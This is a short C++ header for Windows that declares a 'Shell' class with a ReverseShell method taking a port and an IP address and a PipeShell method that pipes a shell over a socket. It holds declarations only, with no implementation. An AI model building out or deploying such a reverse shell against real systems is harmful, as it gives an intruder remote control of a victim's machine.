#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment(lib,"ws2_32")

class Shell
{
private:
	void PipeShell(SOCKET *sock);
public:
	
	Shell();
	~Shell();

	BOOL doServer;
	BOOL ReverseShell(unsigned short cbPort,char *cbIp);

};